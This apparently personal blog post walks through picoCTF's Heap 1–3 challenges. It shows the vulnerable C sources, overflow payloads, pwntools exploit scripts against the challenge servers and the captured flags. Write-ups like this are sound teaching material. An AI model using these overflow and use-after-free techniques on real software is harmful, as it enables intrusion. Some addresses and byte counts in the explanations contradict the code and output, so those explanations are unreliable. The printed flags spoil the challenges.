---
layout: post
title:  "Heap"
description: Understanding buffer overflow vulnerabilities
date:   2024-10-22
pinned: true
tags: ["Medium", "Buffer Overflow", "Binary Exploitation"]
category: [CTF,picoCTF]
---

---

# Heap 1

## Challenge Info
Can you control your overflow? Downloads the binary [here](https://artifacts.picoctf.net/c_tethys/1/chall). Downloads the source [here](https://artifacts.picoctf.net/c_tethys/1/chall.c).

Additional details will be available after launching your challenge instance.

## Understanding chall.c

The code for your convenience:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nThislcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
- The program allocates memory on the heap for two variables: `input_data` and `safe_var`, each being 5 bytes in size.
- `strncpy` copies initial values into these *buffers*.
- The `write_buffer` function allows us to write to the `input_data` var using `scanf`.
- The `check_win` function verifies that the `safe_var` var has been changed from `bico` to `pico`. If it is, then we get our flag.

## Vulnerabilities
There's several vulnerabilities to note:
- The buffer for size for `input_data` and `safe_var` are only 5 bytes, meaning they should be easy to overflow.
- The `scanf` library function does not limit our input size, meaning we can enter strings longer than 5 characters (this should be an instant giveaway that it will be a buffer overflow challenge).


## Connecting to the netcat listener
```terminal
> nc tethys.picoctf.net 55943

Thislcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x63159a0182b0  ->   pico
+-------------+----------------+
[*]   0x63159a0182d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice:
```

To clarify, `pico` and `bico` are the values inside the variables (`input_data` & `safe_var` respectively) that were declared at the start. The reason that the variables are allocated with 5 bytes, despite only containing 4 characters, is because we need a [null character](https://en.wikipedia.org/wiki/Null_character).

To understand the distance between each variables, we subtract the address of `pico` with the address of `bico` (or vice verse).

`0x63c3882552b0 - 0x63c3882552d0 = -0x20.` If we run `-0x20` through [cyber chef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Decimal('Space',false)&input=LTB4MjA) (from hex to decimal) we get a value of `32`. Because our initial hex value was negative, that means that `safe_var` is 32 bytes behind `input_data`.

## Solution

This now know that `safe_var` is 32 bytes behind `input_data` so we just need to overflow the buffer with 32 characters, and then write 'pico' to get our flag.

For the sake of simplicity, it's more efficient to use numbers for our characters. So instead of typing 32 *A's* followed by 'pico': `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico`. This can just count in multiples of *5's* (or whatever you prefer) and then write pico:

Our payloads: `12345123451234512345123451234512pico`
- Six `5`'s = 30
- 30 + 2 = 32 (you've reached `safe_var`)

flag: `picoCTF{starting_to_get_the_hang_79ee3270}`

---

# Heap 2

## Challenge Info
Can you handle function pointers? Downloads the binary [here](https://artifacts.picoctf.net/c_mimas/49/chall). Downloads the source [here](https://artifacts.picoctf.net/c_mimas/49/chall.c).

Additional details will be available after launching your challenge instance.

## Understanding chall.c

The code for your convenience:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

- Defines a constant for the max size of the flag string (`FLAGSIZE_MAX`).
- Two char pointers are declared: `x` is used to store a string, `input_data` stores user input- each being 5 bytes of size.
- A `win()` function is declared. It reads the flag from a file (`flag.txt`) and prints it for us. It uses a buffer to store said flag, and ensures that it doesn't exceed `FLAGSIZE_MAX`
- A `check_win()` is declared. It executes a function at the address stored in the `x` pointer.
- The `init()` function allocates memory for `input_data` and `x`, and initializes them with the strings "pico" and "bico" respectively.
- The `write_buffer()` function asks the use for input, which the function will then store in `input_data` using `scanf` (recall that `scanf` is unsafe, as it does not check for buffer overflows).


## Vulnerabilities
There's several vulnerabilities to note:
- The `write_buffer()` function is using `scanf` to read user input. `scanf` is unsecure and can be overflowed.
- The `input_data` and `x` buffer are allocated to hold only 5 bytes (4 bytes and then a null character)
- The `check_win()` function executes code at the memory address being stored in `x`.


## Connecting to the netcat listener
```terminal
> nc mimas.picoctf.net 55662

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x18572b0  ->   pico
+-------------+-----------+
[*]   0x18572d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice:
```
Again, `pico` and `bico` are the values inside the buffers (`input_data` & `x` respectively) that were declared at the start. Again, the reason they're declared to be 5 bytes, is to leave 1 byte for the null character.

Just like last time, we're given the addresses. The only thing that's different is that these are buffers instead of variables. Again, we'll subtract the address of `pico` with the address of `bico`.

`0x22b82b0 - 0x22b82d0 = -0x20`. When ran through [cyber chef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Decimal('Space',false)&input=LTB4MjA) (from hex to decimal) we get a value of 32. And because like last time, our initial hex value was negative, this means that `input_data` is 32 bytes behind `x`.


## The Plan

This now know that `input_data` is 32 bytes behind `x`. Additionally, we know that the `check_win()` function executes a function at the address stored in the `x` pointer. Finally we know that if a `win()` function is declared, it'll read us the flag.

*So, in short, we want to:* overflow to reach the `x` pointer, and then get it to hold a value identical to the address of the `win()` function, so that when `check_win()` is automatically ran, instead of executing *'bico'* at `x`, it will execute `win()`- thus giving us our flag.

## Solution

Before we write our payloads, we need to know the address corresponding to `win()`. A simple [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) will reveal this:

```terminal
> objdump -d ./chall | grep win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```

This now know that `win()` is at `0x080484b6`. **However**, because of C's memory layout, we need to consider C's memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of `win()` in little-endian order.

Our payloads should look something like this:

```py
from pwn import *

# Connect to the remote service
p = remote("mimas.picoctf.net", 53827)

# Construct the payloads
payloads = b"AAAA" * 8 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"

# Send option '2' to allocate the object
p.sendline(b"2")

# Wait for the server to ask for the buffer input
p.recvuntil(b"buffer:")

# Send the constructed payloads
p.sendline(payloads)

# Wait for the next prompt (choice menu)
p.recvuntil(b"choice:")

# Send option '4' to check for win condition
p.sendline(b"4")

# Print the final output (possibly the flag)
print(p.recvall())
```

flag: `picoCTF{and_down_the_road_we_go_dde41590}`

---

# Heap 3

## Challenge Info
This program mishandles memory. Can you exploit it to get the flag? Downloads the binary [here](https://artifacts.picoctf.net/c_tethys/5/chall). Downloads the source [here](https://artifacts.picoctf.net/c_tethys/5/chall.c).

Additional details will be available after launching your challenge instance.

## Understanding chall.c

The code for your convenience:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

- Defines a constant for the max size of the flag string (`FLAGSIZE_MAX`).
- A structure `object` is defined with 4 character arrays (`a[10]`, `b[10]`,`c[10]`, `flag[5]`).
- Pointer `x` is declared globally, but not yet pointing to anything.
- `init()` functionhttps://chirpy.cotes.page/ is declared, it executes `x = malloc(sizeof(object))`, ensuring that enough memory is reserved for all of struct's members (`a[10]`, `b[10]`,`c[10]`, and `flag[5]`. Additionally, the global pointer `x` is now set to point to this memory block that will hold the previously defined `object` struct.) There's also `int num_allocs`, but this is unused.
- `strncpy()` copies the string `"bico"` into the `flag` member/field of the `object` that `x` is pointing to.
- `alloc_object()` function is declared. It begins by prompting us to input the size of the memory allocation that they want to make.
    - Then, an integer variable `size` is initialized in order to store the size of the allocation. `scanf("%d", &size)` reads an integer input from us and then stores it in the previously initialized `size` variable.
    - Essentially, the program expects us to enter a value that represents the number of bytes we want to allocate.
- `check_win()` function is declared. It checks if `x->flag` matches with `'pico'`. And if it does, then we get our flag. This is essentially the 'win' condition.
- `alloc_object` function is declared, it prompts us to enter a size for dynamic allocation, it then reads an integer, and allocates memory accordingly. Finally, it accepts input to populate this allocated space.

## Vulnerabilities
- Use-After-Free [(UAF)](https://cwe.mitre.org/data/definitions/416.html) vulnerability, because while the `free_memory()` function does free the memory block associated with `x`, it's vulnerable because if `check_win()` is called afterward, then `x->flag` can still be accessed.
- Buffer overflow vulnerability: while the `flag` member in `object` is only 5 bytes, making it very limited, because of `alloc_object`, we could specify a much larger input for the memory allocated to `alloc`. So, if this memory isn't handled correctly, then we can just overwrite memory structures adjacent to `alloc` (hence the buffer overflow).

Before proceeding with the solution, I'll paste the program's interface so that it's easier to visualize:
```terminal
> nc tethys.picoctf.net 62002

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice:
```


## The Plan
So, to exploit this program, we can leverage the UAF vulnerability that I previously discussed. If we combine this with heap allocation manipulation (via buffer overflow), we can overwrite a specific field in a freed structure (`x->flag`) with the string `"pico"`. This is how it would look like step by step:
1. This select option `5` to **free x**.
2. This select option `2` to **allocate** a new block of memory, which is likely to use the same memory area that `x` was previously occupying, because they're goingto have similar size requirements.
    - The allocation size will be between 20 and 40, this way, we increase the likelihood that our new allocation will overlap with the previously freed `object` struct.
    - Recall that the `object` struct has 4 members, for a total of 35 bytes.
    ```c
    typedef struct {
  char a[10]; // ten bytes
  char b[10]; // ten bytes
  char c[10]; // ten bytes
  char flag[5]; // 5 bytes
} object;
    ```
3. While still in the "allocate object" option, we now input a payloads string that will contain `"pico"` at the end to overwrite the previous `flag` value `"bico"`.
4. Select option 4 ("Check for win") and get our flag!

## Solution

The [pwntools](https://docs.pwntools.com/en/stable/) payloads that I came up with is as follows:

```py
from pwn import *

r = remote('tethys.picoctf.net',51280)

r.sendline(b'5')
r.sendline(b'2')

r.sendline(b'40')
payloads = b'A' * 30 + b'pico'


r.sendline(payloads)
r.sendline(b'4')
r.interactive()
```
All of the `r.sendline`'s are for selecting options in the interface. As for the actual payloads, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the `flag` field in the `object` struct has a 5 byte space, due to the program accounting for a [null byte](https://null-byte.wonderhowto.com/newest/).

flag: `picoCTF{now_thats_free_real_estate_a7381726}`
